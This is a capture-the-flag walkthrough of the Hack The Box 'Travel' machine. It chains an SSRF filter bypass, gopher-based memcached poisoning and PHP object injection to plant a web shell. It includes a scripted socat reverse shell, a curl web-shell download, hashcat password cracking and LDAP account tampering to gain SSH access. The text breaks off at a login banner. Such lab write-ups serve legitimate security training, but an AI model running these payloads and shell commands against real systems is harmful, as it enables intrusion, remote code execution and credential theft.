# User

## nmap

```
╭─zoey@parrot-virtual ~/sec
╰─$ nmap -A -p- 10.10.10.189
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-31 01:23 GMT
Nmap scan report for 10.10.10.189
Host is up (0.073s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d3:9f:31:95:7e:5e:11:45:a2:b4:b6:34:c0:2d:2d:bc (RSA)
|   256 ef:3f:44:21:46:8d:eb:6c:39:9c:78:4f:50:b3:f3:6b (ECDSA)
|_  256 3a:01:bc:f8:57:f5:27:a1:68:1d:6a:3d:4e:bc:21:1b (ED25519)
80/tcp  open  http     nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB
443/tcp open  ssl/http nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB - SSL coming soon.
| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
| Not valid before: 2020-04-23T19:24:29
|_Not valid after:  2030-04-21T19:24:29
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.78 seconds

```

This gives use three hostnames to work with on the web server.

## https

Accessing any of the alternative names results in a page that states:

```
We are currently sorting out how to get SSL implemented with multiple domains properly. Also we are experiencing severe performance problems on SSL still.

In the meantime please use our non-SSL websites.

Thanks for your understanding,
admin
```

## http

### blog.travel.htb

Looking at blog.travel.htb source we can tell that it's wordpress, and running wpscan, it informs us that everything looks to be up to date and not vulnerable. There are
various places that seem to direct us toward the RSS functionality and blog-dev, including the text on the main page `Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!` and in the source:

```html
<style id="wp-custom-css">
  /* I am really not sure how to include a custom CSS file
 * in worpress. I am including it directly via Additional CSS for now.
 * TODO: Fixme when copying from -dev to -prod. */

  @import url(http://blog-dev.travel.htb/wp-content/uploads/2020/04/custom-css-version#01.css);
</style>
```

So let's move on to it.

### blog-dev.travel.htb

`/` is forbidden. Let's run some enum:

```shell-session
╭─zoey@virtual-parrot ~/sec/htb ‹master›
╰─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://blog-dev.travel.htb
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://blog-dev.travel.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/26 12:24:07 Starting gobuster
===============================================================
/.git/HEAD (Status: 200)
```

Looks like there's a git repository. Let's see what we can grab with the dumper from https://github.com/internetwache/GitTools:

```shell-session
╭─zoey@virtual-parrot ~/sec/htb/travel ‹master›
╰─$ ../tools/GitTools/Dumper/gitdumper.sh http://blog-dev.travel.htb/.git/ blog-dev-git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########


[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f
[+] Downloaded: objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9
[+] Downloaded: objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039
[+] Downloaded: objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da
```

## Restoring blog-dev git repo

Let's take a look in our new folder and see what we dumped.

```shell-session
╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
╰─$ ls -la
total 12
drwxr-xr-x 3 zoey zoey 4096 May 26 12:31 .
drwxr-xr-x 7 zoey zoey 4096 May 26 12:31 ..
drwxr-xr-x 6 zoey zoey 4096 May 26 12:31 .git
```

Hmmm, not much. Let's take a look at the log:

```shell-session
╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
╰─$ git log --stat
commit 0313850ae948d71767aff2cc8cc0f87a0feeef63 (HEAD -> master)
Author: jane <jane@travel.htb>
Date:   Tue Apr 21 01:34:54 2020 -0700

    moved to git

 README.md        |  21 ++++++++++
 rss_template.php | 114 +++++++++++++++++++++++++++++++++++++++++++++++++++++++
 template.php     |  59 ++++++++++++++++++++++++++++
 3 files changed, 194 insertions(+)
```

So we should have three files. They weren't pulled though, so we'll need to recreate them from the history. We can do this by restoring the 'deleted' files:

```shell-session
╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
╰─$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    README.md
        deleted:    rss_template.php
        deleted:    template.php

no changes added to commit (use "git add" and/or "git commit -a")
╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
╰─$ git restore .
╭─zoey@virtual-parrot ~/sec/htb/travel/blog-dev-git ‹master›
╰─$ ls -la
total 24
drwxr-xr-x 3 zoey zoey 4096 May 26 12:43 .
drwxr-xr-x 7 zoey zoey 4096 May 26 12:31 ..
drwxr-xr-x 6 zoey zoey 4096 May 26 12:43 .git
-rwxr-xr-x 1 zoey zoey  540 May 26 12:43 README.md
-rwxr-xr-x 1 zoey zoey 2970 May 26 12:43 rss_template.php
-rwxr-xr-x 1 zoey zoey 1387 May 26 12:43 template.php
```

## Investigating Git Repo Files

### README.md

This tells us how to setup a wordpress instance and copy in the custom code. Let's assume this is the code that's vulnerable.

### template.php

In template.php we see some attempts to prevent certain vulnerabilities, and that `url_get_contents` makes a call to curl to retrieve contents. Given the call to
`escapeshellargs` we're likely only going to have control over the url, and the exclusion of `file://` and `@` prevents LFI. However, it looks like the check to
prevent SSRF should be easily bypassed by changing the case of `LoCaLhOsT`.

```php
function safe($url)
{
	// this should be secure
	$tmpUrl = urldecode($url);
	if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
	{
		die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
	}
	if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
	{
		die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
	}
	$tmp = parse_url($url, PHP_URL_HOST);
	// preventing all localhost access
	if($tmp == "localhost" or $tmp == "127.0.0.1")
	{
		die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");
	}
	return $url;
}

function url_get_contents ($url) {
  $url = safe($url);
	$url = escapeshellarg($url);
	$pl = "curl ".$url;
	$output = shell_exec($pl);
   return $output;
}
```

There's also a `TemplateHelper` class with a `__wakeup` method which means it's made to
be unserialized. This method also makes a call that writes contents to a file. It seems ripe for php object injection.

```php
    public function __wakeup()
    {
    	$this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
```

### rss_template.php

In this file we see that the query string is processed, and the values are used to retrieve an RSS feed. We should have control over the `custom_feed_url` and `debug`
values in the query string:

```php
 	$url = $_SERVER['QUERY_STRING'];
	if(strpos($url, "custom_feed_url") !== false){
		$tmp = (explode("=", $url));
		$url = end($tmp);
 	 } else {
 	 	$url = "http://www.travel.htb/newsfeed/customfeed.xml";
    }
  ...
  <!--
  DEBUG
  <?php
  if (isset($_GET['debug'])){
    include('debug.php');
  }
  ?>
  -->
```

There's a `get_feed` function that makes the call to curl in `template.php` and uses `SimplePie`, which uses memcached for caching:

```php
function get_feed($url){
     require_once ABSPATH . '/wp-includes/class-simplepie.php';
     $simplepie = null;
     $data = url_get_contents($url);
     if ($url) {
         $simplepie = new SimplePie();
         $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
         //$simplepie->set_raw_data($data);
         $simplepie->set_feed_url($url);
         $simplepie->init();
         $simplepie->handle_content_type();
         if ($simplepie->error) {
             error_log($simplepie->error);
             $simplepie = null;
             $failed = True;
         }
     } else {
         $failed = True;
     }
     return $simplepie;
}
```

This looks promising as we may be able to interact with memcached via SSRF, but there's no obvious serialize/unserialize yet. However,
It seems plausible that a cache might serialize and unserialize its values, so let's investigate `SimplePie`.

## SimplePie

If we [search the wordpress git repo for 'unserialize'](https://github.com/WordPress/WordPress/search?q=unserialize) we find a [Memcache.php](https://github.com/WordPress/WordPress/blob/b3b8942dfcb451eddb5559b63c1043fce5d9449e/wp-includes/SimplePie/Cache/Memcache.php) that's part of SimplePie with the following functions:

```php
	public function save($data)
	{
		if ($data instanceof SimplePie)
		{
			$data = $data->data;
		}
		return $this->cache->set($this->name, serialize($data), MEMCACHE_COMPRESSED, (int) $this->options['extras']['timeout']);
  }

  	/**
	 * Retrieve the data saved to the cache
	 *
	 * @return array Data for SimplePie::$data
	 */
	public function load()
	{
		$data = $this->cache->get($this->name);

		if ($data !== false)
		{
			return unserialize($data);
		}
		return false;
	}
```

So, it would seem that if we can insert a serialized `TemplateHelper` into `memcached`, it can later be retreived by `SimplePie`'s `load` function, which
should then call the `__wakeup method`, and thus write a value into a file in the `/logs` directory. So now we need to figure out how to insert the value
into memcached, and the key that needs to be used. Let's find the code that generates `$this->name`, which looks to be the value used as the key in the
call to set the cache value. In the constructor in the same file we find:

```php
	/**
	 * Create a new cache object
	 *
	 * @param string $location Location string (from SimplePie::$cache_location)
	 * @param string $name Unique ID for the cache
	 * @param string $type Either TYPE_FEED for SimplePie data, or TYPE_IMAGE for image data
	 */
	public function __construct($location, $name, $type)
	{
		$this->options = array(
			'host' => '127.0.0.1',
			'port' => 11211,
			'extras' => array(
				'timeout' => 3600, // one hour
				'prefix' => 'simplepie_',
			),
		);
		$this->options = SimplePie_Misc::array_merge_recursive($this->options, SimplePie_Cache::parse_URL($location));

		$this->name = $this->options['extras']['prefix'] . md5("$name:$type");

		$this->cache = new Memcache();
		$this->cache->addServer($this->options['host'], (int) $this->options['port']);
  }
```

It looks like there are a few things that are still unknown. We could just setup our own instance that reproduces the setup on the box and throw in some
logging statements to spit out the key, which is what I did, and allows for testing our payload later. However, we can also just grok the code.
The prefix, which comes from the `$location`, is what we saw in `rss_template.php`, which is `_xct`. The `TYPE_FEED` we can search for in the source, and
we find it in `SimplePie/Cache/Base.php`:

```php
  /**
	 * Feed cache type
	 *
	 * @var string
	 */
	const TYPE_FEED = 'spc';
```

If we look at the `init` function in `class-simplepi.php` we find the call to get the cache and see the name that's passed is the url:

```php
  if ($this->feed_url !== null) {
    $parsed_feed_url = $this->registry->call('Misc', 'parse_url', array($this->feed_url));

    // Decide whether to enable caching
    if ($this->cache && $parsed_feed_url['scheme'] !== '')
    {
      $url = $this->feed_url . ($this->force_feed ? '#force_feed' : '');
      $cache = $this->registry->call('Cache', 'get_handler', array($this->cache_location, call_user_func($this->cache_name_function, $url), 'spc'));
    }

    // Fetch the data via SimplePie_File into $this->raw_data
    if (($fetched = $this->fetch_data($cache)) === true)
    {
      return true;
    }
    elseif ($fetched === false) {
      return false;
    }

    list($headers, $sniffed) = $fetched;
  }
```

So we'll need to find out what the `cache_name_function` is. Searching within the same file we find:

```php
/**
	 * @var string Function that creates the cache filename
	 * @see SimplePie::set_cache_name_function()
	 * @access private
	 */
	public $cache_name_function = 'md5';
```

So it seems like we should be able to generate the key used with

```php
echo 'xct_' . md5(md5('http://10.10.14.39/feed.html') . ':spc');
```

## Object Injection Payload

We need to setup a serialized php object that's an instance of `TemplateHelper`, so that when the `__wakeup` method is run, we write
a web shell to the logs directory. We can generate and test our payload with the following:

```php
<?php

class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
        echo "__construct($file,$data)\n";
    	$this->init($file, $data);
    }

    public function __wakeup()
    {
        echo "__wakeup($this->file,$this->data)\n";
    	$this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {
        $this->file = $file;
        $this->data = $data;
        echo "init($this->file, $this->data)\n";
    }

}

$th = new TemplateHelper('s.php','<?php System($_GET[1]; ?>');

$s = urlencode(serialize($th));

echo "$s\n";

unserialize(urldecode($s));
```

## memcache SSRF

The last piece of the equation, is to be able to insert an item into memcache via a call to curl. So what's the command we actually want to
execute? Looking up memcache documentation and setting up my own instance I find what works to insert the payload(remember the dots are null bytes):

`set xct_debe7386b5352dfae5de0601d7c1f670 4 0 128 O:14:"TemplateHelper":2:{s:20:".TemplateHelper.file";s:5:"s.php";s:20:".TemplateHelper.data";s:26:"<?php system($_GET[1]); ?>";}`

After some googling we find that we can utilize the `gopher://`(https://hackerone.com/reports/115748) protocol to send newlines with an underscore after the host:port,
and %0a for new lines. Testing this against a local memcached server though, resulted in an error: `CLIENT_ERROR bad data chunk`. After a little more searching
we find a tool https://github.com/tarunkant/Gopherus. Using gopherus for our payload is a bit tricky given that we can't copy/paste in the null bytes properly(which
I learned the hard way), and it seems to calculate the length improperly if we pass the urlencoded payload. Also, `+`'s in the url don't seem to work.
I had to learn all this through trial and error and replicating the box setup on my own machine(an exercise left to the reader). Let's modify our php script to
generate a payload:

```php
<?php

class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
    	$this->init($file, $data);
    }

    public function __wakeup()
    {
    	$this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {
        $this->file = $file;
        $this->data = $data;
    }

}

$th = new TemplateHelper('rs.php','<?php system($_GET[1]); ?>');

$serialized = serialize($th);
$prefix = "gopher://LOCALHOST:11211/_%0d%0a";
$newline = "%0d%0a";
$key = 'xct_' . md5(md5($argv[1]) . ':spc');
$cmd = str_replace("_KEY_", $key, "set _KEY_ 4 0 ");
$cmd = $cmd . strlen($serialized);

$payload = $prefix . rawurlencode($cmd) . $newline . rawurlencode($serialized) . $newline;

echo $payload;
```

FINALLY, we have something to generate a working payload.

## Scripting The Reverse Shell

Let's make a call to the php script we just made for the payload and then use it to make the calls and connect a reverse shell. Be sure blog.travel.htb
resolves to the box's address. I used a different payload the first time trying this as socat is not usually available, but it is, so lets use it
on our scripted way back into the box.

```sh
#!/bin/sh

GREEN="\e[0;32m"
CLEAR="\e[m"

# Get our IP on HTB
htbip=$(ifconfig | grep "destination 10.10" | sed 's/.*destination //')
echo "htb ip ${htbip}"

# Doesn't really matter what this, as long as its consistent, but if you've got your own
# server running you can verify it's being hit
feed_url="http://${htbip}/feed.html"

# Use our php script to generate the injection payload
payload_url=$(php gen-payload-only.php ${feed_url})

echo "${GREEN}- setting memcached value via gopher${CLEAR} ${payload_url}"
curl --silent "http://blog.travel.htb/awesome-rss/?custom_feed_url=${payload_url}" > /dev/null

echo "${GREEN}- sending request for for feed url to initiate object injection..."
curl --silent "http://blog.travel.htb/awesome-rss/?custom_feed_url=${feed_url}" > /dev/null

echo "- using created file to initiate reverse shell...${CLEAR}"
curl --silent "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/rs.php?1=socat%20exec%3A%27bash%20%2Dli%27%2Cpty%2Cstderr%2Csetsid%2Csigint%2Csane%20tcp%3A${htbip}%3A22473" & > /dev/null

# catch reverse shell
socat file:`tty`,raw,echo=0 tcp-listen:22473
```

And let's give it a try:

```shell-session
╭─zoey@parrot-virtual ~/sec/htb/travel ‹master› 
╰─$ ./reverse-shell.sh
htb ip 10.10.14.12
- setting memcached value via gopher gopher://LOCALHOST:11211/_%0d%0aset%20xct_d159dbbff1582b62237476cec033a443%204%200%20129%0d%0aO%3A14%3A%22TemplateHelper%22%3A2%3A%7Bs%3A20%3A%22%00TemplateHelper%00file%22%3Bs%3A6%3A%22rs.php%22%3Bs%3A20%3A%22%00TemplateHelper%00data%22%3Bs%3A26%3A%22%3C%3Fphp%20system%28%24_GET%5B1%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
- sending request for for feed url to initiate object injection...
- using created file to initiate reverse shell...
www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$ ls
rs.php
www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$ whoami
www-data
```

## Persistence

We eventually learn there's likely a script running to remove the files in the `/logs` directory and it kills our web shell. Let
setup some persistence by putting a web shell in a different directory. Just use curl to download a shell
from your local server: `curl http://10.10.14.39/tools/bash.php -o ../bash.php`. Then we can access it at
`http://blog.travel.htb/wp-content/themes/twentytwenty/bash.php`.

Then we can setup a reverse shell. On kali:

```shell-session
╭─zoey@virtual-parrot ~/sec/htb/travel ‹master›
╰─$ socat file:`tty`,raw,echo=0 tcp-listen:22473
www-data@blog:/var/www/html/wp-content/themes/twentytwenty$
```

And on the remote machine via bash.php:

```shell-session
www-data@blog:/var/www/html/wp-content/themes/twentytwenty# socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.39:22473
```

## www-data enum and owning user

So after enuming all the things, looking for vulnerabilities and potential credentials, and trying to crack all the credentials you've found thus far,
check in `/opt/wordpress` and find a `backup-13-04-2020.sql`. Ask yourself why someone would put it there, then investigate it to find a dump of the
wordpress users table near the bottom of the file.

```sql
--
-- Dumping data for table `wp_users`
--

LOCK TABLES `wp_users` WRITE;
/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
INSERT INTO `wp_users` VALUES (1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
```

```shell-session
╭─zoey@virtual-parrot ~/sec/htb/travel ‹master›
╰─$ hashcat -a 0 -m 400 lynik-admin.hash /usr/share/wordlists/rockyou.txt
hashcat (v5.1.0) starting...

* Device #2: Not a native Intel OpenCL runtime. Expect massive speed loss.
             You can use --force to override, but do not report related errors.
nvmlDeviceGetFanSpeed(): Not Supported

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1050, 1010/4042 MB allocatable, 5MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger set to 90c

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=1 -D VENDOR_ID=32 -D CUDA_ARCH=601 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=400 -D _unroll'
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139922194
* Keyspace..: 14344384

$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.:1stepcloser

Session..........: hashcat
Status...........: Cracked
Hash.Type........: phpass, WordPress (MD5), phpBB3 (MD5), Joomla (MD5)
Hash.Target......: $P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.
Time.Started.....: Wed May 27 03:08:27 2020 (2 secs)
Time.Estimated...: Wed May 27 03:08:29 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   323.4 kH/s (6.79ms) @ Accel:256 Loops:256 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 737280/14344384 (5.14%)
Rejected.........: 0/737280 (0.00%)
Restore.Point....: 655360/14344384 (4.57%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7936-8192
Candidates.#1....: grass4 -> 12inchcock
Hardware.Mon.#1..: Temp: 64c Util: 86% Core:1683MHz Mem:3504MHz Bus:16

Started: Wed May 27 03:08:24 2020
Stopped: Wed May 27 03:08:31 2020
```

Use the login name from the backup(`lynik-admin`) and our newly discovered password(`1stepcloser`) to SSH in and `cat user.txt`. Feel satisfied...and then realize this is only halfway.

# Root

## enum

### linpeas

in `/etc/hosts`

```
172.20.0.10 ldap.travel.htb
```

in `/etc/passwd`

```
lynik-admin:x:1001:1001::/home/lynik-admin:/bin/bash
root:x:0:0:root:/root:/bin/bash
trvl-admin:x:1000:1000:trvl-admin:/home/trvl-admin:/bin/bash
```

### nmap on ldap.travel.htb

Setup a socks proxy via ssh and run `nmap` against the ldap server:

```shell-session
╭─zoey@virtual-parrot ~
╰─$ ssh -D localhost:9050 -f -N lynik-admin@travel.htb
╭─zoey@virtual-parrot ~
╰─$ proxychains nmap -T4 -A -p 389,636 172.20.0.10
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 11:34 PDT
Nmap scan report for 172.20.0.10
Host is up (0.076s latency).

PORT    STATE SERVICE  VERSION
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=ldap.travel.htb/organizationName=Travel.HTB/countryName=UK
| Not valid before: 2020-04-19T19:40:33
|_Not valid after:  2030-04-17T19:40:33
636/tcp open  ssl/ldap OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=ldap.travel.htb/organizationName=Travel.HTB/countryName=UK
| Not valid before: 2020-04-19T19:40:33
|_Not valid after:  2030-04-17T19:40:33

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.02 seconds
```

### Home directory

In `.ldaprc`:

```
HOST ldap.travel.htb
BASE dc=travel,dc=htb
BINDDN cn=lynik-admin,dc=travel,dc=htb
```

In `.viminfo`:

```
# Registers:
""1     LINE    0
        BINDPW Theroadlesstraveled
|3,1,1,1,1,0,1587670528,"BINDPW Theroadlesstraveled"

# File marks:
'0  3  0  ~/.ldaprc
|4,48,3,0,1587670530,"~/.ldaprc"
```

## ldap.travel.htb

Searching...

```shell-session
lynik-admin@travel:~$ ldapsearch -D cn=lynik-admin,dc=travel,dc=htb -w Theroadlesstraveled -x -b 'dc=travel,dc=htb'
# extended LDIF
#
# LDAPv3
# base <dc=travel,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# travel.htb
dn: dc=travel,dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: Travel.HTB
dc: travel

# admin, travel.htb
dn: cn=admin,dc=travel,dc=htb
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator

# servers, travel.htb
dn: ou=servers,dc=travel,dc=htb
description: Servers
objectClass: organizationalUnit
ou: servers

# lynik-admin, travel.htb
dn: cn=lynik-admin,dc=travel,dc=htb
description: LDAP administrator
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: lynik-admin
userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=
 =

...

# jane, users, linux, servers, travel.htb
dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: jane
cn: Jane Rodriguez
sn: Rodriguez
givenName: Jane
loginShell: /bin/bash
uidNumber: 5005
gidNumber: 5000
homeDirectory: /home/jane
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount

...

# search result
search: 2
result: 0 Success

# numResponses: 1
```

### JXplorer and ProxyChains

Not knowing much about ldap I setup proxy chains with [JXplorer](http://jxplorer.org/). It allowed me to easily explore the hierarchy and test what values I could change/add/etc...

```
╭─zoey@virtual-parrot ~
╰─$ ssh -D localhost:9050 -f -N lynik-admin@travel.htb
╭─zoey@virtual-parrot ~
╰─$ proxychains /bin/java -Dfile.encoding=utf-8 -Xms2048m -cp ".:jars/*:jasper/lib/*" com.ca.directory.jxplorer.JXplorer
```

Turns out that you can easily modify attributes, but that's about it, and we can't modify the `uid`. I also learned form JXplorer that you need to
add the `ldapPublicKey` `objectClass`, before you can add the `sshPublicKey` object. A little googling reveals the required attributes(https://tylersguides.com/guides/openldap-how-to-add-a-user/). Let's see if we can script the modification and get in by altering the uid and guid numbers to those of `trvl-admin`.

## Owning trvl-admin

Note: You can skip this step if you like, it's unnecessary, but was part of the learning process for me. Let's create a script to make the necessary changes so we can ssh in:

```sh
#!/bin/sh

ssh_public_key="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCHtkd8s52uvd5zuCIgf0e8nm38SLNIKLd4l/v4Xzi6ONcGQbsFE15J54fEuNdZZOQV4CQZ0a20tDz7cPx/S+vItI/dxcxOl0UWKHn6ut6gH2Tj0P4hutXEBkqF0BsPpQhzD9ZXb3CtRTWYnjycmPLs+VKvSjICH0ZHTrgYHeArs2XQ18ZHCBIUlO1a9wkQjDbD0oyPLjiqRd856ktOQ7RX5wyHeY3eXDm539tqdPNJvWzkCzF8ncLDaKBRDwua+OtZS/1xA6m4WLiEYYBVtS+S9xKjIbbU0HMONWykMvFhb8jx8ULb5KKLUbW0wx9FJsSHbgUSwHRegh8RmqRCOQaVZH8fo6bwsw2YKtKjDzTL8E4gqv3opbItxQ4FEUsvj3kW6Bcxmoo4y+yrHJf+YJsbZUn0Q5UVV+XVHAnOOuUnmv6LAOisxKpS7/F/m3oC6m95Jx45TFCKx+c9Avo7+S+llbdegaUAF31Hyspy70tjV75UXfF2Q9IDrCERAxQAQU="

echo "dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
replace: uidNumber
uidNumber: 1000
-
replace: gidNumber
gidNumber: 1000
-
replace: homeDirectory
homeDirectory: /home/trvl-admin
-
add: objectClass
objectClass: ldapPublicKey" | ldapmodify -D cn=lynik-admin,dc=travel,dc=htb -w Theroadlesstraveled -x

echo "dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
replace: sshPublicKey
sshPublicKey: ${ssh_public_key}" | ldapmodify -D cn=lynik-admin,dc=travel,dc=htb -w Theroadlesstraveled -x
```

Searching after our changes shows:

```shell-session
lynik-admin@travel:~/tmp$ ldapsearch -D cn=lynik-admin,dc=travel,dc=htb -w Theroadlesstraveled -x -b 'dc=travel,dc=htb' 'uid=jane'
# extended LDIF
#
# LDAPv3
# base <dc=travel,dc=htb> with scope subtree
# filter: uid=jane
# requesting: ALL
#

# jane, users, linux, servers, travel.htb
dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: jane
cn: Jane Rodriguez
sn: Rodriguez
givenName: Jane
loginShell: /bin/bash
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
objectClass: ldapPublicKey
uidNumber: 1000
gidNumber: 1000
homeDirectory: /home/trvl-admin
sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCHtkd8s52uvd5zuCIgf0e8nm3
 8SLNIKLd4l/v4Xzi6ONcGQbsFE15J54fEuNdZZOQV4CQZ0a20tDz7cPx/S+vItI/dxcxOl0UWKHn6
 ut6gH2Tj0P4hutXEBkqF0BsPpQhzD9ZXb3CtRTWYnjycmPLs+VKvSjICH0ZHTrgYHeArs2XQ18ZHC
 BIUlO1a9wkQjDbD0oyPLjiqRd856ktOQ7RX5wyHeY3eXDm539tqdPNJvWzkCzF8ncLDaKBRDwua+O
 tZS/1xA6m4WLiEYYBVtS+S9xKjIbbU0HMONWykMvFhb8jx8ULb5KKLUbW0wx9FJsSHbgUSwHRegh8
 RmqRCOQaVZH8fo6bwsw2YKtKjDzTL8E4gqv3opbItxQ4FEUsvj3kW6Bcxmoo4y+yrHJf+YJsbZUn0
 Q5UVV+XVHAnOOuUnmv6LAOisxKpS7/F/m3oC6m95Jx45TFCKx+c9Avo7+S+llbdegaUAF31Hyspy7
 0tjV75UXfF2Q9IDrCERAxQAQU=

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Let's try to SSH in as jane now:

```shell-session
╭─zoey@virtual-parrot ~/sec/htb/travel ‹master›
╰─$ ssh jane@travel.htb
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Fri 29 May 2020 08:57:28 PM UTC

  System load:                      0.0
  Usage of /:                       46.1% of 15.68GB
